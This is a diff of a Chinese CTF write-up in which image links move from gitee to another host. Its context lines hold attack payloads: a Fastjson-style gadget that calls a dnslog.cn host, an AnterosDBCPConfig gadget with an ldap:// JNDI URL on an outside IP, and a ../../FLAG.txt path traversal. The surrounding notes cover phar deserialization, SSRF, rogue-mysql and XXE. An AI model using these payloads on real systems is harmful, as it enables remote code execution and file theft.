@@ -6,7 +6,7 @@
 ["java.net.InetAddress","khl16k.dnslog.cn"]
 ```
 
-![image-20220124084950989](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220124084950989.png)
+![image-20220124084950989](https://img.dem0dem0.top/images/image-20220124084950989.png)
 
 ```
 ["br.com.anteros.dbcp.AnterosDBCPConfig", {"healthCheckRegistry": "ldap://8.142.93.103:9090/test"}]
@@ -118,7 +118,7 @@ filename=../../FLAG.txt&qwqeqwe=<!
 
   然后猜测是phar反序列化，为什么没有继续研究这个函数就可以知道了，这是来自于一个ctf赛狗的直觉。然后剩下的其实就没有什么难度，
 
-  ![image-20220126180820632](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220126180820632.png)
+  ![image-20220126180820632](https://img.dem0dem0.top/images/image-20220126180820632.png)
 
 可以触发__call方法，我们要做的就是顺着这个思路继续做下去，ssrf就可以了。
 
@@ -153,7 +153,7 @@ $phar->stopBuffering();
 
 - 解法2
 
-  ![image-20220126180926609](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220126180926609.png)
+  ![image-20220126180926609](https://img.dem0dem0.top/images/image-20220126180926609.png)
 
 利用这里我们可以伪造一个mysql请求，利用rogue-mysql攻击来。但其实我没有理解这个有什么用...
 
@@ -224,7 +224,7 @@ printwriter xmldecoder 反序列化`就有`https://www.cnblogs.com/peterpan07070
 
 ## 0x09 [FireshellCTF2020]Cars
 
-![image-20220127111502435](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220127111502435.png)
+![image-20220127111502435](https://img.dem0dem0.top/images/image-20220127111502435.png)
 
 输入可控的位置，我们post数据上去，发现直接传输键值对，返回bad_data,于是我们猜想是不是该用json，发现成功，json可以的话xml也可以，发现不仅可以而且有回显，成功打出。
 
